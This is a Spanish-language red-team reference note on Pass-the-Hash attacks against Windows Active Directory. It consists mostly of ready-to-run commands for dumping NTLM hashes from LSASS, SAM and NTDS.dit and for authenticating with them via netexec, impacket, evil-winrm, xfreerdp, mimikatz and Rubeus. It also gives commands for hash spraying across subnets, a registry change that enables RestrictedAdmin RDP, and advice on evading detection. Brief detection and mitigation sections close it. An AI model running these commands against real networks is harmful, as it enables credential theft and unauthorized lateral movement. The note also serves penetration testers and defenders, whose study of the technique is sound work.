---
aliases:
  - PtH
  - NTLM Pass-the-Hash
  - Hash Spray
tags:
  - type/atomic
  - technique/lateral-movement
  - technique/credential-access
  - env/windows
  - asset/active-directory
  - cred/ntlm
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
tertiary categories:
  - "[[Active Directory]]"
type: Atomic
linked:
  - "[[Active Directory Explotación]]"
  - "[[Kerberos Pass-the-Ticket]]"
  - "[[LSASS Dumping]]"
  - "[[DCSync]]"
---
# Pass-the-Hash

***

## Cheatsheet
^pass-the-hash

| Tool | Command |
| --- | --- |
| **netexec (SMB)** | `nxc smb TARGET -u user -H NTHASH` |
| **netexec (domain)** | `nxc smb TARGETS -u user -H HASH -d dom.local` |
| **netexec local-auth** | `nxc smb TARGET -u administrator -H HASH --local-auth` |
| **impacket-psexec** | `impacket-psexec -hashes :NTHASH dom.local/user@TARGET` |
| **impacket-wmiexec** | `impacket-wmiexec -hashes :NTHASH dom.local/user@TARGET` |
| **impacket-smbexec** | `impacket-smbexec -hashes :NTHASH dom.local/user@TARGET` |
| **evil-winrm** | `evil-winrm -i TARGET -u user -H NTHASH` |
| **xfreerdp (RestrictedAdmin)** | `xfreerdp /v:TARGET /u:user /pth:NTHASH` |
| **pth-winexe / pth-* suite** | `pth-winexe -U dom/user%:NTHASH //TARGET cmd.exe` |
| **mimikatz on-host** | `sekurlsa::pth /user:admin /domain:dom.local /ntlm:HASH /run:cmd.exe` |

***

## Concepto

Windows NTLM autentica con el **NT hash** de la password, no la password misma. Si capturaste el hash (via LSASS, SAM, DCSync, NTDS), podés autenticarte a cualquier servicio que acepte NTLM sin crackearlo.

Formato hash: `aad3b435b51404eeaad3b435b51404ee:abc123NTHASH` (LM:NT). LM suele ser blank en dominios modernos; solo NT importa.

## Requisitos

- NT hash del user target.
- Servicio destino acepta NTLM (SMB, WinRM, RDP con RestrictedAdmin, etc.).
- User con permisos en destino (local admin, Remote Management Users, etc.).

## 1. Obtener hashes

### LSASS dump
```
mimikatz # sekurlsa::logonpasswords
mimikatz # sekurlsa::msv
```

### SAM (local)
```cmd
reg save HKLM\SAM SAM
reg save HKLM\SYSTEM SYSTEM
impacket-secretsdump LOCAL -sam SAM -system SYSTEM
```

### DCSync → hashes de dominio
Ver [[DCSync]].

### NTDS.dit
```bash
impacket-secretsdump LOCAL -ntds ntds.dit -system SYSTEM
```

### Responder (NetNTLMv2) — **NO es PtH directo**
NetNTLMv2 hash solo para crack/relay, no para PtH. Confusión común.

## 2. PtH local (local account)

```bash
# Admin local vía hash
nxc smb 10.10.10.5 -u administrator -H abc123NTHASH --local-auth

# Pass-the-hash spray sobre rango (local admin reuse)
nxc smb 10.10.10.0/24 -u administrator -H NTHASH --local-auth

# Con shell
impacket-psexec -hashes :NTHASH administrator@10.10.10.5
```

## 3. PtH dominio

```bash
# netexec
nxc smb TARGET -u user -H NTHASH -d dom.local

# Enum shares, users, sessions
nxc smb TARGETS -u user -H NTHASH --shares --sessions --loggedon-users

# impacket
impacket-psexec dom.local/user@TARGET -hashes :NTHASH
impacket-wmiexec dom.local/user@TARGET -hashes :NTHASH  # menos ruidoso
impacket-smbexec dom.local/user@TARGET -hashes :NTHASH  # sin drop binary
impacket-dcomexec dom.local/user@TARGET -hashes :NTHASH  # MMC20/ShellWindows
```

## 4. PtH WinRM

```bash
# evil-winrm
evil-winrm -i TARGET -u user -H NTHASH

# netexec
nxc winrm TARGET -u user -H NTHASH -x 'whoami'

# impacket
impacket-wmiexec -hashes :NTHASH dom.local/user@TARGET
```

Requiere user en `Remote Management Users` o `Administrators` local.

## 5. PtH RDP (RestrictedAdmin)

```bash
# Linux
xfreerdp /v:TARGET /u:user /d:dom.local /pth:NTHASH /dynamic-resolution
```

Requiere en el target:
```cmd
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
```

Set vía GPO en dominio o abuso post-exploitation (no default).

## 6. PtH + mimikatz on-host (inyección)

```
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:administrator /domain:dom.local /ntlm:NTHASH /run:cmd.exe
```

Abre cmd con credenciales inyectadas → usar herramientas normales de Windows (`net use \\target\c$`, `PsExec.exe`, etc.).

## 7. OverPass-the-Hash (Hash → Kerberos TGT)

Convierte PtH a Kerberos → evade detección NTLM-only.

```powershell
# Rubeus
.\Rubeus.exe asktgt /user:administrator /rc4:NTHASH /domain:dom.local /ptt

# Con AES (menos crackeable)
.\Rubeus.exe asktgt /user:administrator /aes256:AESKEY /domain:dom.local /ptt

# Entonces ticket inyectado:
dir \\dc\c$
```

Ver [[Kerberos Pass-the-Ticket]].

## 8. Password spray con hashes

```bash
# Un hash sobre muchos users
nxc smb TARGET -u users.txt -H NTHASH --continue-on-success

# Hashes sobre users diferentes
nxc smb TARGETS -u users.txt -H hashes.txt --no-bruteforce --continue-on-success
```

## 9. OpSec

### Detecciones NTLM
- **Event 4624** logon type 3 con "Authentication Package: NTLM" sobre host que normalmente usa Kerberos.
- **Event 4776** en DC con error 0xC000006A si el user correcto con hash errado.
- EDR correlaciona process lineage (cmd.exe spawned from `sekurlsa::pth`).

### Evasion
- Preferir Over-PtH (Kerberos) en dominios que loguean NTLM agresivamente.
- `wmiexec` / `dcomexec` más silenciosos que `psexec` (no crea service).
- Evitar PtH hacia DCs directamente — triggerea alertas.
- Local admin PtH es más aceptable (no toca AD).

## 10. Mitigaciones del blue

- **Protected Users** group — desactiva NTLM + retiene no cached creds.
- **LAPS** — password local admin único por host → PtH spray rompe.
- **Restricted Admin** mode evita dejar creds en memoria tras RDP.
- **Credential Guard** — VSM aísla LSASS.
- **Disable NTLM** o restringir con `Restrict NTLM` GPO.
- **Account Tiering** (T0/T1/T2) — DA no loguea en workstations.

## Recursos

- [HackTricks - PtH](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/pass-the-hash)
- [Microsoft - Mitigating PtH](https://www.microsoft.com/en-us/download/details.aspx?id=36036)
- [impacket examples](https://github.com/fortra/impacket/tree/master/examples)

***
